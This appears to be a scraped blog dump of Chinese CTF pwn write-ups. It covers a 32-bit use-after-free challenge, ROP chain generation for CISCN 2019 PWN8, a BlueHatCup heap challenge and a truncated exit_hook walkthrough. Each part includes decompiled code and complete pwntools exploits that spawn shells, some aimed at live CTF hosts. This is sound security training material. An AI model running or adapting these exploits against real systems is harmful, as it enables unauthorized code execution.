&#x27;/var/run/vmblock-fuse/blockdir/FsiUbs/UAF&#x27; [*] &#x27;/var/run/vmblock-fuse/blockdir/FsiUbs/UAF&#x27;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled\n先看main函数\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  int v3[4]; // [esp+8h] [ebp-10h] BYREF  v3[1] = __readgsdword(0x14u);  setbuf(stdin, 0);  setbuf(stdout, 0);  while ( 1 )  &#123;    while ( 1 )    &#123;      puts(&quot;1.create&quot;);      puts(&quot;2.edit&quot;);      puts(&quot;3.delete&quot;);      puts(&quot;4.show&quot;);      putchar(58);      __isoc99_scanf(&quot;%d&quot;, v3);      if ( v3[0] != 2 )        break;      edit();    &#125;    if ( v3[0] &gt; 2 )    &#123;      if ( v3[0] == 3 )      &#123;        del();      &#125;      else if ( v3[0] == 4 )      &#123;        show();      &#125;      else      &#123;LABEL_13:        puts(&quot;Invalid choice&quot;);      &#125;    &#125;    else    &#123;      if ( v3[0] != 1 )        goto LABEL_13;      create();    &#125;  &#125;&#125;\n很标准的菜单题，跟进每个函数看看\nint create()&#123;  int result; // eax  int v1; // ebx  char *v2; // eax  printf(&quot;you are creating the %d page\\n&quot;, i);  result = i;  if ( i &gt;= 0 ) //重要  &#123;    result = i;    if ( i &lt;= 9 )    &#123;      v1 = i;      (&amp;page)[v1] = (char *)malloc(8u);//chunk大小固定为0x8      if ( i )      &#123;        if ( i &lt;= 0 || i &gt; 9 )        &#123;          return puts(&quot;NO PAGE&quot;);        &#125;        else        &#123;          puts(&quot;Good cretation!&quot;);          return ++i;        &#125;      &#125;      else      &#123;        v2 = page;        *(_DWORD *)page = 1868654951;        v2[4] = 0;        *((_DWORD *)page + 1) = echo; //page + 1中的1是指1个字长，因为是32位程序，所以page + 1 = page + 4 bytes        puts(&quot;The init page&quot;);        return ++i;      &#125;    &#125;  &#125;  return result;&#125;\ncreat函数的重点有三处：1.创建chunk的时候采用的是++i，与其他输入index来创建的题有所不同2.能创建chunk0，因为“if ( i &gt;&#x3D; 0 )”3.注意注释中的page + 1处，意思就是page地址的下一个字长的内容更改为echo这个函数看看echo\nint __cdecl echo(char *s)&#123;  return puts(s);&#125;\nputs是个好东西\nunsigned int edit()&#123;  int v1; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &lt;= 0 || v1 &gt; i )  //注意这里并不能edit到chunk0  &#123;    puts(&quot;NO PAGE&quot;);  &#125;  else  &#123;    puts(&quot;Input your strings&quot;);    __isoc99_scanf(&quot;%s&quot;, (&amp;page)[v1]);  &#125;  return __readgsdword(0x14u) ^ v2;&#125;\nedit函数，就是输入你要编辑的chunk，然后再输入要更改的内容\nunsigned int show()&#123;  int v1; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 )  &#123;    if ( v1 &lt;= 0 || v1 &gt; i )      puts(&quot;NO PAGE&quot;);    else      echo((&amp;page)[v1]);  &#125;  else  &#123;    (*((void (__cdecl **)(char *))page + 1))(page); //这里也是page + 4 bytes  &#125;  return __readgsdword(0x14u) ^ v2;&#125;  \n这句代码的作用是什么？先执行指针所指向的地址的下一个字长的指令 接着用指针所指向的地址的内容当作先前执行的指令的参数所以当我们不对chunk内容进行任何溢出时，仅仅只是输入小于一个字长的数据时show函数就相当于调用了echo函数把chunk的内容puts了出来\nunsigned int del()&#123;  int v1; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &lt; 0 || v1 &gt; i )    puts(&quot;NO PAGE&quot;);  else    free((&amp;page)[v1]);  return __readgsdword(0x14u) ^ v2;&#125;\ndelete函数，这里就要讲讲UAF的成因了例如此处，假设已经申请了chunk0chunk0被free后，其指针并没有被清空此时申请chunk1而由于每一次申请的chunk大小都是0x8此时申请的page1大小小于等于page0系统就会把chunk0[已经被free，指针(page0)存入fastbin]的空间再次分配给chunk1即此时chunk0与chunk1共享空间因此可以实现利用page1控制chunk0即UAF，Use After Free\n这里有个小问题，我使用Ubuntu 20.04进行动调时page0会被存入tcache，但是仍然会被复用等研究tcache的时候再来补充\n回到本题思路NICO函数处存在一处system我们用edit函数修改chunk0的内容为 “sh\\x00\\x00”然后溢出到下一个字长 修改其内容为system的地址这样当我们执行show函数的时候 其就会使用chunk内的sh当作system函数的参数执行system(‘sh’)，拿到shell\n这里再解释一下为什么是 ‘sh\\x00\\x00’32位的程序一个字长只有4个字节 如果我们使用的是&#x2F;bin&#x2F;sh显然字节不够所以使用sh也能达成对应的操作 至于后面的两个\\x00 是为了填充字节 又不至于破坏sh字符串\nfrom pwn import *p = process(&#x27;./UAF&#x27;)#p = remote(&#x27;1.14.71.254&#x27;,28674)elf = ELF(&#x27;./UAF&#x27;)context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)NICO = 0x80484E0 def add_chunk():    p.recvuntil(b&#x27;:&#x27;)    p.sendline(b&#x27;1&#x27;)  def edit_chunk(index, string):    p.recvuntil(b&#x27;:&#x27;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;page\\n&#x27;)    p.sendline(str(index))    p.recvuntil(b&#x27;strings\\n&#x27;)    p.sendline(string)  def del_chunk(index):    p.recvuntil(b&#x27;:&#x27;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&#x27;page\\n&#x27;)    p.sendline(str(index))  def show_chunk(index):    p.recvuntil(b&#x27;:&#x27;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(b&#x27;page\\n&#x27;)    p.sendline(str(index)) def debug():    gdb.attach()    pause(p)#debug() add_chunk()del_chunk(0)add_chunk()edit_chunk(1, b&#x27;sh\\x00\\x00&#x27; + p32(NICO)) show_chunk(0) p.interactive()","categories":["heap"],"tags":["UAF"]},{"title":"android_root","url":"/2024/12/03/android-root/","content":""},{"title":"ROPgadget","url":"/2023/08/10/ROPgadget/","content":"安装\nsudo apt-get install python-capstonegit clone https://github.com/JonathanSalwan/ROPgadget.gitcd ROPgadgetsudo -H python3 setup.py install\n一般使用\n┌──(str1d3r㉿str1k3Gwindows)-[~/Desktop]└─$ ROPgadget --binary &lt;file &gt; |grep &quot;&lt;gadget&gt;&quot;\n\n特殊情况给出一例题[CISCN 2019华南]PWN8\n┌──(str1d3r㉿str1k3Gwindows)-[~/Desktop/nssctf/[CISCN 2019华南]PWN8]└─$ python exp.py[+] Starting local process &#x27;./pwn&#x27;: pid 221[DEBUG] &#x27;/[CISCN 2019华南]PWN8/pwn&#x27; is statically linked, skipping GOT/PLT symbols[*] &#x27;/[CISCN 2019华南]PWN8/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\nROPgadget --binary pwn --ropchain\n面对静态链接的题，ROPgadget可以自动生成rop链\n#!/usr/bin/env python3# execve generated by ROPgadgetfrom struct import pack# Padding goes herep = b&#x27;&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax ; retp += b&#x27;/bin//sh&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004006e6) # pop rdi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x000000000044c156) # pop rdx ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000040139c) # syscall\n再来看看这道题还有什么别的：main\n__int64 sub_4005A0()&#123;  char v1[520]; // [rsp+0h] [rbp-208h] BYREF  sub_400BF0();  sub_410550(&quot;Please enter your Password: &quot;);  sub_449BE0(0, v1, 0x200uLL);  if ( (unsigned int)sub_400C40(v1) )    sub_410550(&quot;Correct!&quot;);  else    sub_410550(&quot;Wrong!&quot;);  return 0LL;&#125;\nprintf\n__int64 __fastcall sub_410550(__int64 a1)&#123;  __int64 v2; // rax  _QWORD *v3; // rbp  __int64 v4; // rbx  _DWORD *v5; // rdi  int v6; // eax  unsigned __int64 v8; // r8  bool v10; // zf  int v11; // eax  __int64 v12; // r13  _BYTE *v13; // rax  unsigned __int64 v14; // rbx  __int64 v15; // rdx  v2 = sub_4004C0();  v3 = off_6BA7A0;  v4 = v2;  v5 = off_6BA7A0;  if ( (*(_DWORD *)off_6BA7A0 &amp; 0x8000) == 0 )  &#123;    _RDX = *((_QWORD *)off_6BA7A0 + 17);    v8 = __readfsqword(0x10u);    if ( *(_QWORD *)(_RDX + 8) == v8 )    &#123;LABEL_9:      ++*(_DWORD *)(_RDX + 4);      goto LABEL_10;    &#125;    _ESI = 1;    v10 = dword_6BD80C == 0;    if ( dword_6BD80C )    &#123;      v6 = *(_DWORD *)off_6BA7A0 &amp; 0x8000;      if ( v6 == _InterlockedCompareExchange((volatile signed __int32 *)_RDX, 1, v6) )        goto LABEL_8;    &#125;    else    &#123;      __asm &#123; cmpxchg [rdx], esi &#125;      if ( v10 )      &#123;LABEL_8:        _RDX = v3[17];        v5 = off_6BA7A0;        *(_QWORD *)(_RDX + 8) = v8;        goto LABEL_9;      &#125;    &#125;    sub_44C130(_RDX, 1LL);    goto LABEL_8;  &#125;LABEL_10:  v11 = v5[48];  if ( v11 )  &#123;    if ( v11 != -1 )      goto LABEL_28;  &#125;  else  &#123;    v5[48] = -1;  &#125;  v12 = *((_QWORD *)v5 + 27);  if ( (char *)&amp;off_6BC2C8 - (char *)&amp;unk_6BBC20 &lt;= (unsigned __int64)(v12 - (_QWORD)&amp;unk_6BBC20) )  &#123;    sub_412C50();    v5 = off_6BA7A0;  &#125;  if ( v4 != (*(__int64 (__fastcall **)(_DWORD *, __int64, __int64))(v12 + 56))(v5, a1, v4) )    goto LABEL_28;  v13 = (_BYTE *)*((_QWORD *)off_6BA7A0 + 5);  if ( (unsigned __int64)v13 &lt; *((_QWORD *)off_6BA7A0 + 6) )  &#123;    *((_QWORD *)off_6BA7A0 + 5) = v13 + 1;    *v13 = 10;    goto LABEL_17;  &#125;  if ( (unsigned int)sub_416970(off_6BA7A0, 10LL) == -1 )  &#123;LABEL_28:    LODWORD(v14) = -1;    goto LABEL_19;  &#125;LABEL_17:  v14 = v4 + 1;  if ( v14 &gt; 0x7FFFFFFF )    LODWORD(v14) = 0x7FFFFFFF;LABEL_19:  if ( (*(_DWORD *)v3 &amp; 0x8000) == 0 )  &#123;    v15 = v3[17];    v10 = (*(_DWORD *)(v15 + 4))-- == 1;    if ( v10 )    &#123;      *(_QWORD *)(v15 + 8) = 0LL;      if ( dword_6BD80C )      &#123;        if ( !_InterlockedDecrement((volatile signed __int32 *)v15) )          return (unsigned int)v14;        goto LABEL_25;      &#125;      v10 = (*(_DWORD *)v15)-- == 1;      if ( !v10 )LABEL_25:        sub_44C160(v15);    &#125;  &#125;  return (unsigned int)v14;&#125;\nread\nunsigned __int64 __fastcall sub_449BE0(unsigned int fd, char *buf, size_t count)&#123;  unsigned __int64 result; // rax  unsigned __int64 v5; // rax  unsigned int v6; // r8d  unsigned __int64 v7; // [rsp+0h] [rbp-20h]  if ( dword_6BD80C )  &#123;    sub_44C180();    v5 = sys_read(fd, buf, count);    if ( v5 &gt; 0xFFFFFFFFFFFFF000LL )    &#123;      __writefsdword(0xFFFFFFC0, -(int)v5);      v5 = -1LL;    &#125;    v7 = v5;    sub_44C1E0(v6);    return v7;  &#125;  else  &#123;    result = sys_read(fd, buf, count);    if ( result &gt; 0xFFFFFFFFFFFFF000LL )    &#123;      __writefsdword(0xFFFFFFC0, -(int)result);      return -1LL;    &#125;  &#125;  return result;&#125;\n这个函数会把传入的参数进行异或，所以我们要先把先前生成的rop链异或再传入,顺便缩短一下ropchain\n_BOOL8 __fastcall sub_400C40(const char *a1)&#123;  char *v1; // rbp  int v2; // edx  unsigned int v3; // eax  __int64 v4; // rbp  __int64 v5; // r12  char *v6; // rax  char *v7; // rdx  _BOOL8 result; // rax  char v9; // [rsp+8h] [rbp-50h] BYREF  _BYTE v10[7]; // [rsp+9h] [rbp-4Fh] BYREF  char v11[72]; // [rsp+10h] [rbp-48h] BYREF  v1 = strcpy(&amp;v9, a1);  do  &#123;    v2 = *(_DWORD *)v1;    v1 += 4;    v3 = ~v2 &amp; (v2 - 16843009) &amp; 0x80808080;  &#125;  while ( !v3 );  if ( (~v2 &amp; (v2 - 16843009) &amp; 0x8080) == 0 )    v3 &gt;&gt;= 16;  if ( (~v2 &amp; (v2 - 16843009) &amp; 0x8080) == 0 )    v1 += 2;  v4 = &amp;v1[-__CFADD__((_BYTE)v3, (_BYTE)v3) - 3] - &amp;v9;  v5 = sub_4102B0(&quot;pass_enc.txt&quot;, &amp;unk_4A593F);  if ( (__int16)v4 &gt; 0 )  &#123;    v6 = v10;    v7 = &amp;v9;    while ( 1 )    &#123;      *v7 ^= 0x66u; //这里有个异或      v7 = v6;      if ( v6 == &amp;v10[(__int16)v4 - 1] )        break;      ++v6;    &#125;  &#125;  result = 0LL;  if ( v5 )  &#123;    sub_4103D0(v11, 40LL, 1LL, v5);    sub_40FD50(v5);    return (unsigned int)sub_400498(v11, &amp;v9) == 0;  &#125;  return result;&#125;\nexp:\nfrom ctypes import *from pwn import *#io = process(&#x27;./pwn&#x27;)io = remote(&#x27;node3.anna.nssctf.cn&#x27;,28324)context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)elf = ELF(&#x27;./pwn&#x27;)from struct import pack# Padding goes herep = b&#x27;&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax ; retp += b&#x27;/bin//sh&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004006e6) # pop rdi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000449bf5) # pop rdx ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax ; retp += p64(59)p += pack(&#x27;&lt;Q&#x27;, 0x000000000040139c) # syscallep = b&#x27;&#x27;for i in range(len(p)):        ep += p8(ord(p[i:i+1]) ^ 0x66)    payload = b&#x27;a&#x27;*0x50 + epio.sendafter(b&#x27;Password: \\n&#x27;, payload)io.interactive()","categories":["stack"],"tags":["shellcode"]},{"title":"BlueHatCup_semi_pwns","url":"/2023/09/17/blue-cup-pwns/","content":"对大佬来说很简单，对我这种菜猫来说刚刚好UAFchecksec\n└─# checksec main[*] &#x27;/mnt/attachment/main&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled\n进入debugmode前存在格式化字符串漏洞，可以泄露stack\nvoid __noreturn sub_1336()&#123;  void *v0; // [rsp+0h] [rbp-20h] BYREF  const void *buf; // [rsp+8h] [rbp-18h] BYREF  char s[8]; // [rsp+14h] [rbp-Ch] BYREF  int v3; // [rsp+1Ch] [rbp-4h]  puts(&quot;Tell me ur name: &quot;);  memset(s, 0, sizeof(s));  read(0, s, 8uLL);  printf(s);  puts(&quot;DEBUG MODE ON&quot;);  puts(&quot;1. READ&quot;);  puts(&quot;2. WRITE&quot;);  puts(&quot;&gt;&gt; &quot;);  v3 = sub_12F0();  if ( v3 == 1 )  &#123;    puts(&quot;READ MODE: &quot;);    read(0, &amp;buf, 8uLL);    write(0, buf, 8uLL);  &#125;  if ( v3 == 2 )  &#123;    puts(&quot;WRITE MODE: &quot;);    read(0, &amp;v0, 8uLL);    read(0, v0, 8uLL);  &#125;  exit(0);&#125;\n有两种方法进入debug，case4,当没有初始化堆时能进入\nif ( !v3 )  &#123;    puts(&quot;Nothing to show&quot;);    puts(&quot;May be need to check?&quot;);    sub_1336();  &#125;\n\ncase5，login为admin\nint sub_1836()&#123;  char s[16]; // [rsp+0h] [rbp-10h] BYREF  memset(s, 0, sizeof(s));  puts(&quot;Passwd: &quot;);  read(0, s, 0x10uLL);  if ( !strcmp(s, s2) )  &#123;    puts(&quot;Login Success!&quot;);    sub_1336();  &#125;  return puts(&quot;Login Failed!&quot;);&#125;\n密码在这\n.data:0000000000004010 31 32 33 34 35 36 37 38 39 30+s2 db &#x27;1234567890&#x27;,0 \n\n接下来看堆部分add没有对chunk大小进行限制限制了16个chunk\nint sub_14B9()&#123;  int result; // eax  char s[512]; // [rsp+0h] [rbp-210h] BYREF  void *dest; // [rsp+200h] [rbp-10h]  int v3; // [rsp+208h] [rbp-8h]  int i; // [rsp+20Ch] [rbp-4h]  for ( i = 0; i &lt;= 16 &amp;&amp; qword_40A0[i]; ++i )    ;  if ( i == 16 )    return puts(&quot;No Space!&quot;);  puts(&quot;Tell me the book content size: &quot;);  v3 = sub_12F0();  memset(s, 0, sizeof(s));  puts(&quot;Tell me the book content: &quot;);  read(0, s, v3);  dest = malloc(v3);  memcpy(dest, s, v3);  qword_40A0[i] = dest;  result = v3;  dword_4060[i] = v3;  return result;&#125;\ndelete没有置空指针存在uaf，但是是glibc2.31，doublefree需要改key但是可以unsorted泄露libc\n&#123;  _DWORD *v0; // rax  unsigned int v2; // [rsp+Ch] [rbp-4h]  puts(&quot;Tell me the book index: &quot;);  v2 = sub_12F0();  if ( qword_40A0[v2] &amp;&amp; v2 &lt;= 0xF )  &#123;    free((void *)qword_40A0[v2]);    v0 = dword_4060;    dword_4060[v2] = 0;  &#125;  else  &#123;    LODWORD(v0) = puts(&quot;Invalid!&quot;);  &#125;  return (int)v0;&#125;\n可以通过unsortedbin来泄露libc\ndebugmode最后有个exit,考虑打exithook\nfrom pwn import *p = remote(&#x27;120.78.172.238&#x27;,49149)#p = process(&#x27;./main&#x27;)elf = ELF(&quot;./main&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def add(size,payload):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&quot;Tell me the book content size:&quot;)    p.sendline(str(size))    p.recvuntil(b&quot;Tell me the book content:&quot;)    p.send(payload)def delete(index):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;Tell me the book index:&#x27;)    p.sendline(str(index))def edit(index,payload):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&quot;Tell me the book index:&quot;)    p.sendline(str(index))    p.sendlineafter(b&quot;Tell me the book content:&quot;,payload)def check():    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(b&#x27;4&#x27;)def login():    p.sendlineafter(b&#x27;&gt;&gt; \\n&#x27;, b&#x27;5&#x27;)    p.sendlineafter(b&#x27;Passwd: \\n&#x27;, b&#x27;1234567890\\x00&#x27;)one_gadgets= [0xe6c7e,0xe6c81,0xe6c84]add(0x420,b&#x27;aaaa&#x27;) #0add(0x10,b&#x27;aaaa&#x27;) #1delete(0)check()  #leak_libclibc_base = u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;)) - 0x1ebbe0#debug4offsetsuccess(&#x27;libc_base:%s&#x27;,libc_base)free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]sys_addr=libc_base+libc.sym[&#x27;system&#x27;]bin_sh=libc_base+next(libc.search(b&#x27;/bin/sh\\x00&#x27;))one_gadget = libc_base + 0xe6c7e#debug()login()p.sendlineafter(b&#x27;name: \\n&#x27;, b&#x27;%7$p&#x27;)p.recvuntil(b&#x27;0x&#x27;)stack = int(p.recv(12), 16) #leak_stack#success(&#x27;stack:%s&#x27;,hex(stack))exit_hook = libc_base + 0x222060 + 3848 #exit_hook#success(&#x27;exit_hook:%s&#x27;,hex(exit_hook))p.sendlineafter(b&#x27;&gt;&gt; \\n&#x27;, b&#x27;2&#x27;)p.sendafter(b&#x27;WRITE MODE: \\n&#x27;, p64(exit_hook))sleep(1)p.sendline(p64(one_gadget))#pause()success(&#x27;libc_base:%s&#x27;,libc_base)success(&#x27;sys_addr:%s&#x27;,hex(sys_addr))success(&#x27;bin_sh:%s&#x27;,hex(bin_sh))success(&#x27;one_gadget:%s&#x27;,hex(one_gadget))success(&#x27;stack:%s&#x27;,hex(stack))success(&#x27;exit_hook:%s&#x27;,hex(exit_hook))p.interactive()\n","categories":["wp"]},{"title":"exit_hook","url":"/2023/09/06/exit-hook/","content":"//gcc exit.c -g -no-pie -o exit#include&lt;stdio.h&gt;void main()&#123;\tprintf(&quot;str1k3\\n&quot;);\texit(0); &#125;\n看看exit\n► 0x7ffff7e08a40 &lt;exit&gt;         endbr64    0x7ffff7e08a44 &lt;exit+4&gt;       push   rax   0x7ffff7e08a45 &lt;exit+5&gt;       pop    rax   0x7ffff7e08a46 &lt;exit+6&gt;       mov    ecx, 1   0x7ffff7e08a4b &lt;exit+11&gt;      mov    edx, 1   0x7ffff7e08a50 &lt;exit+16&gt;      lea    rsi, [rip + 0x1a5cc1]         &lt;__exit_funcs&gt;   0x7ffff7e08a57 &lt;exit+23&gt;      sub    rsp, 8   0x7ffff7e08a5b &lt;exit+27&gt;      call   __run_exit_handlers                &lt;__run_exit_handlers&gt;\n跟进 __run_exit_handlers看看\n  0x7ffff7e0888a &lt;__run_exit_handlers+218&gt;    mov    rdi, qword ptr [rax + 0x20]  0x7ffff7e0888e &lt;__run_exit_handlers+222&gt;    mov    qword ptr [rax + 0x10], 0  0x7ffff7e08896 &lt;__run_exit_handlers+230&gt;    mov    esi, ebp  0x7ffff7e08898 &lt;__run_exit_handlers+232&gt;    ror    rdx, 0x11  0x7ffff7e0889c &lt;__run_exit_handlers+236&gt;    xor    rdx, qword ptr fs:[0x30]► 0x7ffff7e088a5 &lt;__run_exit_handlers+245&gt;    call   rdx                           &lt;_dl_fini&gt;\n调用了_dl_fini，接着跟进\n0x7ffff7fe0dca &lt;_dl_fini+106&gt;    lea    rdi, [rip + 0x1cb97]          &lt;_rtld_global+2312&gt;  0x7ffff7fe0dd1 &lt;_dl_fini+113&gt;    call   qword ptr [rip + 0x1d191]     &lt;rtld_lock_default_lock_recursive&gt;\n0x7ffff7fe103f &lt;_dl_fini+735&gt;    cmovne rdi, r13   